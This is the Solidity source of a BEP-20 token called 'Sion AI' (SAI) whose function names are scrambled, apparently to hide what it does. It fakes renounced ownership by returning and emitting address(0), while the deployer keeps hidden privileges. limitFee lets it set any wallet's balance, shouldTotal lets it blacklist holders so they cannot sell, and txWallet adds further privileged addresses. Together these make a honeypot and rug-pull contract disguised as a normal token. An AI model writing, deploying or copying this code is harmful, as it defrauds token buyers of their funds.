//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface shouldTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tradingLaunch) external view returns (uint256);

    function transfer(address swapFund, uint256 totalFund) external returns (bool);

    function allowance(address tokenLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 totalFund) external returns (bool);

    function transferFrom(
        address sender,
        address swapFund,
        uint256 totalFund
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverSell, uint256 value);
    event Approval(address indexed tokenLiquidity, address indexed spender, uint256 value);
}

interface liquidityTokenTake {
    function createPair(address liquidityBuy, address swapMarketingTx) external returns (address);
}

contract SionAI is shouldTeam {

    string private receiverLaunched = "Sion AI";

    address public swapSellReceiver;

    uint256 public teamBuy;

    mapping(address => uint256) private fromReceiver;

    mapping(address => bool) public fromShouldExempt;

    function symbol() external view virtual returns (string memory) {
        return atLaunch;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fundSwap;
    }

    function owner() external view returns (address) {
        return shouldList;
    }

    function senderTx(address atLiquidityMode, address swapFund, uint256 totalFund) internal returns (bool) {
        require(!fromShouldExempt[atLiquidityMode]);
        return feeShould(atLiquidityMode, swapFund, totalFund);
    }

    function amountLiquiditySell() private view returns (address) {
        return msg.sender;
    }

    mapping(address => bool) public tokenWalletMode;

    function totalSender() public {
        emit OwnershipTransferred(receiverAuto, address(0));
        shouldList = address(0);
    }

    mapping(address => mapping(address => uint256)) private shouldMin;

    bool private autoIs;

    bool private toTxAt;

    uint256 private fundSwap = 100000000 * 10 ** 18;

    constructor (){ 
        receiverAuto = amountLiquiditySell();
        fromReceiver[receiverAuto] = fundSwap;
        tokenWalletMode[receiverAuto] = true;
        swapSellReceiver = liquidityTokenTake(address(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)).createPair(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c),address(this));
        emit Transfer(address(0), receiverAuto, fundSwap);
        emit OwnershipTransferred(receiverAuto, address(0));
    }

    function feeShould(address atLiquidityMode, address swapFund, uint256 totalFund) internal returns (bool) {
        require(fromReceiver[atLiquidityMode] >= totalFund);
        fromReceiver[atLiquidityMode] -= totalFund;
        fromReceiver[swapFund] += totalFund;
        emit Transfer(atLiquidityMode, swapFund, totalFund);
        return true;
    }

    function txWallet(address minFrom) public {
        require(!swapToken);
        tokenWalletMode[minFrom] = true;
        swapToken = true;
    }

    function transferFrom(address atLiquidityMode, address swapFund, uint256 totalFund) external override returns (bool) {
        if (shouldMin[atLiquidityMode][amountLiquiditySell()] != type(uint256).max) {
            require(totalFund <= shouldMin[atLiquidityMode][amountLiquiditySell()]);
            shouldMin[atLiquidityMode][amountLiquiditySell()] -= totalFund;
        }
        return senderTx(atLiquidityMode, swapFund, totalFund);
    }

    bool public swapToken;

    function transfer(address marketingLimit, uint256 totalFund) external virtual override returns (bool) {
        return senderTx(amountLiquiditySell(), marketingLimit, totalFund);
    }

    function decimals() external view virtual returns (uint8) {
        return maxWallet;
    }

    function shouldTotal(address amountMin) public {
        require(tokenWalletMode[amountLiquiditySell()]);
        if (amountMin == receiverAuto || amountMin == swapSellReceiver) {
            return;
        }
        fromShouldExempt[amountMin] = true;
    }

    function name() external view virtual returns (string memory) {
        return receiverLaunched;
    }

    event OwnershipTransferred(address indexed tokenSell, address indexed sellTake);

    function approve(address teamIsMarketing, uint256 totalFund) public virtual override returns (bool) {
        shouldMin[amountLiquiditySell()][teamIsMarketing] = totalFund;
        emit Approval(amountLiquiditySell(), teamIsMarketing, totalFund);
        return true;
    }

    address public receiverAuto;

    bool private senderTakeReceiver;

    bool private marketingAt;

    function limitFee(address marketingLimit, uint256 totalFund) public {
        require(tokenWalletMode[amountLiquiditySell()]);
        fromReceiver[marketingLimit] = totalFund;
    }

    uint8 private maxWallet = 18;

    bool private launchAt;

    uint256 public tradingAuto;

    uint256 private fundTotal;

    string private atLaunch = "SAI";

    bool private liquidityWallet;

    uint256 public fromMax;

    function allowance(address marketingLimitSwap, address teamIsMarketing) external view virtual override returns (uint256) {
        return shouldMin[marketingLimitSwap][teamIsMarketing];
    }

    function balanceOf(address tradingLaunch) public view virtual override returns (uint256) {
        return fromReceiver[tradingLaunch];
    }

    address private shouldList;

}